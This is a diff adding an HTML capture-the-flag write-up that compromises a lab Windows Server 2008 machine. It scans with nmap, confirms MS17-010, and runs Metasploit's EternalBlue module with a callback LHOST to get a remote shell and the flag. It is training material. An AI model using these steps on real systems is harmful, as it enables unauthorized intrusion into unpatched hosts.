@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Professional Writeup on Capturing the Flag</title>
+</head>
+<body>
+<h1>Professional Writeup on Capturing the Flag</h1>
+
+<p>In this writeup, I will detail the steps taken to capture the flag on the target machine using a combination of networking and exploitation tools. The process involves downloading the VPN configuration, scanning for vulnerabilities, confirming them, and then exploiting the target system. Here's a step-by-step guide to the process:</p>
+
+<h2>Step 1: Setting Up the VPN 🌐</h2>
+<p>First, I downloaded the VPN configuration file from the Pwntilldwn website, where the target machines are hosted. To start the VPN connection, I used the OpenVPN command as follows:</p>
+<pre><code>$ openvpn pwntilldwn.ovpn
+</code></pre>
+<p>This connected me to the network where the target machines reside.</p>
+
+<h2>Step 2: Scanning the Target Machine 🔍</h2>
+<p>Once connected, I powered up the target machine, which was assigned the IP address <code>10.150.150.242</code>. To gather information about the open ports and services running on this IP, I utilized the Nmap tool with the following command:</p>
+<pre><code>$ sudo nmap -sS -A -T4 -oN nmap1.txt 10.150.150.242
+</code></pre>
+<p>The scan revealed that port 445 was open:</p>
+<pre><code>445/tcp open microsoft-ds Windows Server 2008 R2 Enterprise 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+</code></pre>
+
+<h2>Step 3: Checking for Vulnerabilities ⚠️</h2>
+<p>To identify any vulnerabilities on the target machine, particularly on port 445, I ran an Nmap script for vulnerability detection:</p>
+<pre><code>$ nmap -p445 --script vuln 10.150.150.242
+</code></pre>
+<p>The output indicated that the machine was vulnerable to the Remote Code Execution vulnerability in Microsoft SMBv1 servers (MS17-010), which has a high risk factor.</p>
+
+<h2>Step 4: Using Metasploit for Exploitation 🚀</h2>
+<p>With the vulnerability identified, I turned to Metasploit for exploitation. I started Metasploit with:</p>
+<pre><code>$ msfconsole
+</code></pre>
+<p>Then, I searched for the MS17-010 exploit and confirmed the presence of the EternalBlue exploit module:</p>
+<pre><code>msf5 > search ms17-010
+</code></pre>
+<p>To confirm the vulnerability, I used the SMB scanner auxiliary module:</p>
+<pre><code>msf5 > use auxiliary/scanner/smb/smb_ms17_010
+msf5 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 10.150.150.242
+msf5 auxiliary(scanner/smb/smb_ms17_010) > run
+</code></pre>
+<p>This confirmed my suspicions about the vulnerability.</p>
+
+<h2>Step 5: Executing the Exploit 💥</h2>
+<p>Next, I used the EternalBlue exploit module to attack the target system:</p>
+<pre><code>msf5 > use exploit/windows/smb/ms17_010_eternalblue
+msf5 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.150.150.242
+msf5 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.66.67.210
+msf5 exploit(windows/smb/ms17_010_eternalblue) > exploit
+</code></pre>
+<p>The exploit ran successfully, granting me access to the system.</p>
+
+<h2>Step 6: Accessing the System and Retrieving the Flag 🎉</h2>
+<p>With successful exploitation, I verified the network interface:</p>
+<pre><code>msf5 exploit(windows/smb/ms17_010_eternalblue) > ipconfig
+</code></pre>
+<p>Then, I accessed the shell:</p>
+<pre><code>msf5 exploit(windows/smb/ms17_010_eternalblue) > shell
+</code></pre>
+<p>Once in the shell, I navigated to the flag location, retrieved it, and submitted it to complete the challenge.</p>
+
+<p>Through meticulous scanning, vulnerability detection, and exploitation, I was able to successfully capture the flag</p>
+</body>
+</html>
